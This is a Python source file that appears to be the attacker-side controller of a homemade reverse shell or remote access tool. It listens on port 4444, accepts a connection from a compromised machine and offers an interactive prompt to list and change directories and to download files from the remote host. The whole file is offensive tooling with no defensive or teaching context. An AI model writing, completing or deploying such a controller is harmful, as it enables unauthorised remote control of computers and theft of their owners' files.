import socket
import codecs
import os
import sys
s = socket.socket()
s.bind(("192.168.1.6",4444))
s.listen(5)
s.settimeout(2)
c,a = s.accept()
c.settimeout(6)
point = 1
store=b''
store_data=b''
recover_data=b''
show_data=b''
store =codecs.decode(c.recv(100))
while True:
 shell = input("shell"+">>> ")          # taking command
 move_data = shell.split()
 if shell=="ls":   #first command
  c.send(codecs.encode(shell))
  store_data=b''
  while True:
   try: 
    data = c.recv(1024)
    store_data = store_data + data
    if len(data)<1024:
     break
   except:
    break
  if store_data[0:2]==b'ls': 
   for i in codecs.decode(store_data[2:len(store_data)]).split():
    print(i)
 if shell=="back":    # third command
  c.send(codecs.encode(shell))
  store_data=b''
  while True:
   data = c.recv(1024)
   store_data = store_data + data
   if len(data)<1024:
    break
  if store_data[0:4]==b"back":
   print(store_data)   
   decode_data = codecs.decode(store_data)   
   store = decode_data[4:len(decode_data)]
 try:
  if move_data[0]=="cd" and move_data[1]!='':
   try:
    c.send(codecs.encode(move_data[0]+" "+move_data[1])) 
    store_data=b''
    while True:
     data = c.recv(1024)
     if data=="error":
      print("wrong directory/file")
     store_data = store_data + data
     if len(data)<1024:
      break
    store = codecs.decode(store_data)
   except:
    print(move_data[1]+" is not a directory")
 except:
  pass 
 try:
  if move_data[0]=="download" and move_data[1]!='':
   c.send(codecs.encode(move_data[0]+" "+move_data[1]))
   f = open(move_data[1],"wb")    
   data = c.recv(1024)
   while data:
    f.write(data)
    data = c.recv(1024)
   print("check")
   print(len(store_data))
   f.write(store_data)
   print("written in file")
   f.close()
 except:
  pass
 if shell == "close":
  c.close()